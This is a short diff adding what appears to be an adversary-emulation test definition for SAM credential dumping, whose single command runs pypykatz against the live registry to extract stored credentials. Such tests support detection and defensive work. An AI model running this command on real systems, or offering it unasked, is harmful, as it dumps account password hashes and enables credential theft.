@@ -1,0 +1,12 @@
+#TechniqueName: OS Credential Dumping: Security Account Manager
+#AtomicTestName: Registry parse with pypykatz
+#Description: Parses registry hives to obtain stored credentials&
+#Language: cmd
+
+#get_prereq_commands
+echo "Python 3 must be installed manually"
+
+
+#commands
+pypykatz live registry
+
